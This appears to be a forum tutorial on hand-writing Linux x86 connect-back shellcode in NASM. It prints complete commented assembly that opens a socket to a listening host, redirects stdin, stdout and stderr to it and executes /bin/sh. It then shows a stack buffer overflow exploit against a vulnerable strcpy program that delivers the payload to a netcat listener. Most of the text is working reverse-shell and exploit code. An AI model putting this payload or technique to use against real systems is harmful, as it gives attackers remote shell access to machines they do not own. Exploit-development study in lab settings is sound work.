    Shellcoding--Why custom shellcodes can be useful!!!

    -------------===Shellcoding- Why custom shellcodes can be useful??==------------

    Hey all, i never really understood the power of custom shellcoding until recently. Till that it was just copy+paste stuff.

    Pls refer: vividmachines dot com for basic intro to shellcoding..Here , our objective is to create a connect back shellcode in Linux . I used nasm as the assembler.

    In order to create a shellcode that makes use of sockets , we need socketcall() syscall which is syscall no #102 or 0x66

    Before that, lets see why connect back shellcode is preferred over bindshell, the reason is because firewalls have strong ingress filters(filter heavily the incoming connections) but relatively very weak egress filtering(outbound connections)

    There are some rules to be followed while creating a shellcode that makes use of socketcall() in linux.

    * eax must point to the syscall no (as always)

    * ebx must point to the type of socket call..
    Code:
    $ cat /usr/include/linux/net.h
[..output trimmed]
#define SYS_SOCKET      1               /* sys_socket(2)                */
#define SYS_BIND        2               /* sys_bind(2)                  */
#define SYS_CONNECT     3               /* sys_connect(2)               */
#define SYS_LISTEN      4               /* sys_listen(2)                */
#define SYS_ACCEPT      5               /* sys_accept(2)                */
#define SYS_GETSOCKNAME 6               /* sys_getsockname(2)           */
#define SYS_GETPEERNAME 7               /* sys_getpeername(2)           */
#define SYS_SOCKETPAIR  8               /* sys_socketpair(2)            */
#define SYS_SEND        9               /* sys_send(2)                  */
#define SYS_RECV        10              /* sys_recv(2)                  */
#define SYS_SENDTO      11              /* sys_sendto(2)                */
#define SYS_RECVFROM    12              /* sys_recvfrom(2)      
[output trimmed...]
    *ecx must point to the arguments to the socket call..


    Lets build our connect back shellcode...The code is heavily commented..

    Code:
    ;connectback_shell.s 
BITS 32 ;inform nasm it deals with 32 bit

push BYTE 0x66 ;0x66 is socketcall() ,use this way to avoid null byte prob
pop eax  
; ok this requires some explanation...cdq stands for convert word to double word ,
;it will overwrite edx with the sign bit of eax ie the MSB(which in this case is 0),more optimized than using
;xor edx,edx to clear the edx register
cdq
xor ebx,ebx ;clear ebx register ,avoid null byte
inc ebx;ebx=1 socket()
;arguments need to pushed in reverse order 
;int socket(int domain,int type,int protocol );
;domain --> AF_INET [2] 
;type -->SOCK_STREAM[1]
;protocol -->0
;In case you wonder how i knew AF_INET is 2 etc , compile a program using socket() and disassemble
;it in the debugger and see
push edx
push BYTE 0x1
push BYTE 0x2
mov ecx,esp ;make esp point to the arguments
int 0x80 ; issue an interrupt to service the socket()
;returns a socket file descriptor
;save in esi
xchg esi,eax

;connect()
;connect(int sockfd,struct sockaddr*,int len)
push BYTE 0x66 ;eax should be 102 , socketcall()
pop eax
;build the sockaddr * structure first
;struct sockaddr_in server
inc ebx ;AF_INET=2
;server.sin_addr.s_addr=inet_addr("127.0.0.1");
;note that we cant push 0 onto the stack else our shellcode will contain null bytes
;so we push 0xbbbb instead of 0x0000
push DWORD 0x01bbbb7f ;note the little endian format
mov WORD [esp+1],dx ;make it 127.0.0.1
;server.sin_port=htons(port)
;0x697a is 27002 , but when it gets pushed due to little endian format stored as 0x7a69 == 31337
push WORD 0x697a 
;server.sin_family=AF_INET , ebx contains 2 which is AF_INET
push WORD bx
mov ecx,esp ;pointer to structure
;lets build the args
push BYTE 0x16 ;leng of struct sockaddr 
push ecx ; pointer to structure
push esi ;saved socket file descriptor
inc ebx ; ebx-->3 , connect()
mov ecx,esp;make ecx pointer to args
int 0x80 

xchg ebx,esi ;make ebx contain the saved socket file descriptor

;Before moving a little theory..using dup2() we can manipulate the stdin,stdout,stderr of the
;server to respond via the saved socketfile descriptor 
; A small example...
; Take this C program
; we know that stdout is 1
; int fd=open("test.txt",O_CREAT|O_RDWR|O_APPEND,S_IRUSR|S_IWUSR); rw-------
; dup2(fd,1);
; write(fd,"LOLA",4);
; will be displayed to stdout ..similar to 2>&1 in bash (which merges stderr and stdout)
; so if we make stdin,stdout,stderr merge with saved socket file descriptor ,we can issue commands
; via the socket itself (provided we execute a shell after that)
;dup2 syscall no # 0x3f
;dup2(oldfd,newfd)
;duplicate 0,1,2 fd ie stdin,stdout,stderr
push BYTE 0x2
pop ecx ;start with stderr
dup_loop:
   mov BYTE al,0x3f ;eax --> 0x3f syscall no for dup2()
   int 0x80 ;issue interrupt
   dec ecx 
   jns dup_loop

;exec tiny shell              
;execve(char * path,char *arg[],char *env[]);
;for execve the syscall no is #11
;except for socketcall() , rest all syscalls should be of this way
; eax-->syscall no
; ebx-->first arg
; ecx-->second arg
; And so on....
xor eax,eax  ;zero out eax
;push /bin//sh\x00 in reverse order (little endian-ness)
;note that /bin/sh and /bin//sh are the same..
push eax 
push 0x68732f2f
push 0x6e69622f
mov ebx,esp ; 1st arg to address of /bin/sh\0 ie ebx points to pathname
push eax
mov edx,esp ;3rd arg to null terminated address(env) ie edx points to NULL environment
push ebx 
mov ecx,esp ; 2nd arg to address of  ebx (ptr to ptr) ie ecx points to pathname(terminated with 	         ;NULL)
mov al,11;eax-->11 syscall for execve()
int 0x80 ;interrupt...
    Testing time...

    In one terminal ,

    Code:
    root@elysian:~ # nc -lvp 31337 &
[2] 13716
listening on [any] 31337 ...
    In another terminal lets attack abo1.c (from gera's insecure programming)

    Code:
    /*code modified slightly for ease of use */
#include<stdio.h>
#include<string.h>
int main(int argv, char **argc)
{
   char buffer[80];
   strcpy(buffer,argc[1]);
}
    shellcode is at 0xbffffe11

    Lets exploit...

    Code:
    root@elysian:~/exploit_dev/insecure_prog # ./abo1 $(perl -e 'print "\x11\xfe\xff\xbf" x 25')
    In another terminal...

    Code:
    root@elysian:~ # connect to [127.0.0.1] from localhost [127.0.0.1] 42668
